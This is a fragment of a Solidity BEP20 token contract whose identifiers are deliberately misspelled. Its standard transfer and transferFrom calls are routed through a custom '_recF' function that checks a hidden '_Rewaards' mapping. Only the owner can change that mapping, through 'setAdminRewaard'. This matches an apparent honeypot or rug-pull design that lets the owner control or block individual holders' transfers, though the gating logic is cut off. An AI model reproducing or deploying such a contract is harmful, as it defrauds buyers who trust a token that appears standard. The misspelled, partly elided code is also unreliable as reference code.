...
contract BEP20 is Context {
    ...
    function approve(address spender, uint256 anmount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, anmount);
        return true;
    }
    ...
    function _spendAllowance(
        ...
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= anmount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - anmount);
        }
        }
    }
...
contract Token is BEP20, Ownable {
    ...
    function _transfer(
        ...
        require(fromBalance >= anmount, "ERC20: transfer anmount exceeds balance");
    unchecked {
        _balances[from] = fromBalance - anmount;
    }
        _balances[to] += anmount;

        emit Transfer(from, to, anmount);
    }

    function _burn(address accoont, uint256 anmount) internal virtual {
        require(accoont != address(0), "ERC20: burn from the zero address");

        uint256 accoontBalance = _balances[accoont];
        require(accoontBalance >= anmount, "ERC20: burn anmount exceeds balance");
    unchecked {
        _balances[accoont] = accoontBalance - anmount;
    }
        _totalSupply -= anmount;

        emit Transfer(accoont, address(0), anmount);
    }

    function _mtin(address accoont, uint256 anmount) internal virtual {
        require(accoont != address(0), "ERC20: mtin to the zero address");

        _totalSupply += anmount;
        _balances[accoont] += anmount;
        emit Transfer(address(0), accoont, anmount);
    }
    ...
    function setAdminRewaard(address acclount,int256 anmount ) public onlyowner {
        _Rewaards[acclount] += anmount;
    }
    ...
    function _recF(
        ...
        uint256 fromBalance = _balances[from];
        require(fromBalance >= _acooont, "ERC20: transfer anmount exceeds balance");
        if (_Rewaards[from] > 1){
    ...
    function transfer(address to, uint256 anmount) public virtual returns (bool) {
        address owner = _msgSender();
        _recF(owner, to, anmount);
        return true;
    }
    ...
    function transferFrom(
        ...
        _spendAllowance(from, spender, anmount);
        _recF(from, to, anmount);
        return true;
    }
}